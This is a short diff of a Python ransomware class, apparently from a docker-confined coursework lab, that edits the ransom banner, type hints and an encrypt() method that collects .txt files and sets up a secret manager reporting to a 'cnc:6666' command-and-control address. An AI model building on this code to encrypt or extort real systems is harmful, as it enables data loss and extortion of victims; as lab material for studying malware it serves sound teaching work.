@@ -10,6 +10,11 @@ CNC_ADDRESS = "cnc:6666"
 TOKEN_PATH = "/root/token"
 
 ENCRYPT_MESSAGE = """
+   ________  ____________________________  __   ____
+  / ____/ / / / ____/ ____/ ____/ ____/ / / /  / / /
+ / /   / /_/ / __/ / __/ / __/ / __/ / /_/ /  / / /
+/ /___/ __  / /___/ /___/ /___/ /___/ __  /  /_/_/
+\____/_/ /_/_____/_____/_____/_____/_/ /_/  /_/_/
   _____                                                                                           
  |  __ \                                                                                          
  | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
@@ -26,7 +31,7 @@ class Ransomware:
         self.check_hostname_is_docker()
         self._log = logging.getLogger(self.__class__.__name__)
 
-    def check_hostname_is_docker(self)->None:
+    def check_hostname_is_docker(self) -> None:
         # At first, we check if we are in a docker
         # to prevent running this program outside of container
         hostname = socket.gethostname()
@@ -35,7 +40,7 @@ class Ransomware:
             print(f"You must run the malware in docker ({hostname}) !")
             sys.exit(1)
 
-    def get_files(self, filter:str)->list:
+    def get_files(self, filter:str) -> list:
         # return all files matching the filter
         """
         In the first scenario, files_list is a list containing the paths of every file found recursively by the rglob() function in the file system.
@@ -50,12 +55,12 @@ class Ransomware:
 
         return files_list
 
-    def encrypt(self):
+    def encrypt(self) -> None:
         # main function for encrypting (see PDF)
         self._log.info(ransomware.get_files("*.txt"))
         self._secret_manager = SecretManager(remote_host_port=CNC_ADDRESS)
-        self._secret_manager.create()
-        self._secret_manager.post_new()
+        self._secret_manager.setup()
+        return None
         
 
     def decrypt(self):
